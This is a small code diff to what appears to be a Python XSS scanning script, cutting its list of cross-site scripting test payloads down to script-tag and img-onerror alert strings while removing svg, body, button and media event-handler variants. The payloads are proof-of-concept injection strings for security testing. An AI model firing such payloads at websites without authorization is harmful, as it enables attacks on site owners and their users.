@@ -7,14 +7,7 @@ import tldextract
 payloads = [
     "<script>alert('XSS')</script>",
     "'\"><script>alert('XSS')</script>",
-    "<img src='x' onerror='alert(\"XSS\")'>",
-    "'\"><svg onload=alert(1)>",
-    "'\"><input type=\"image\" src=x onerror=alert(1)>",
-    "'\"><body onload=alert(1)>",
-    "'\"><b onmouseover=alert(1)>",
-    "'\"><button onclick=alert(1)>",
-    "'\"><video src=\"x\" onerror=alert(1)>",
-    "'\"><audio src=\"x\" onerror=alert(1)>"
+    "<img src='x' onerror='alert(\"XSS\")'>"
 ]
 
 # 🔁 Visited URLs to avoid duplicates
